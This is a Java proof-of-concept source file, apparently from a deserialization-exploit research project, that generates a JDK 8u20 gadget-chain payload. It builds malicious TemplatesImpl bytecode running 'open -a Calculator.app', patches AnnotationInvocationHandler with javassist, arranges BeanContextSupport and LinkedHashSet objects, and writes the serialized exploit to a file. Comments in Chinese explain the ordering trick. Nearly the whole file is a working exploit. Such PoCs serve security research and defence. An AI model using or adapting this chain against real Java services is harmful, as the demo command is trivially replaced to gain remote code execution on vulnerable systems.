package xyz.eki.marshalexp.poc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.MiscUtils;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextSupport;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;


//https://tttang.com/archive/1729/#toc_poc2
public class Jdk8u20 {
    public static Class newInvocationHandlerClass() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get("sun.reflect.annotation.AnnotationInvocationHandler");
        CtMethod writeObject = CtMethod.make("    private void writeObject(java.io.ObjectOutputStream os) throws java.io.IOException {\n" +
                "        os.defaultWriteObject();\n" +
                "    }",clazz);
        clazz.addMethod(writeObject);
        return clazz.toClass();
    }

    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = GTemplates.getEvilTemplates("open -a Calculator.app");

        Class ihClass = newInvocationHandlerClass();
        InvocationHandler ih = (InvocationHandler) ReflectUtils.getFirstCtor(ihClass).newInstance(Override.class,new HashMap<>());

        ReflectUtils.setFieldValue(ih,"type", Templates.class);
        Templates proxy = ReflectUtils.createProxy(ih,Templates.class);

        BeanContextSupport b = new BeanContextSupport();
        ReflectUtils.setFieldValue(b,"serializable",1);
        HashMap tmpMap = new HashMap<>();
        tmpMap.put(ih,null);
        ReflectUtils.setFieldValue(b,"children",tmpMap);


        LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy
        set.add(b);
        set.add(templates);
        set.add(proxy);

        HashMap hm = new HashMap();
        hm.put("f5a5a608",templates);
        ReflectUtils.setFieldValue(ih,"memberValues",hm);

        byte[] ser = SerializeUtils.serialize(set);

        byte[] shouldReplace = new byte[]{0x78,0x70,0x77,0x04,0x00,0x00,0x00,0x00,0x78,0x71};

        FileOutputStream fos = new FileOutputStream("ser.data");

//        int i = ByteUtil.getSubarrayIndex(ser,shouldReplace);
//        ser = ByteUtil.deleteAt(ser,i); // delete 0x78
//        ser = ByteUtil.deleteAt(ser,i); // delete 0x70

        fos.write(ser);
        fos.close();

// 不能直接 Deserializer.deserialize(ser) , 除非 redefine 了 AnnotationInvocationHandler 否则会报错
//        Deserializer.deserialize(ser);

    }
}
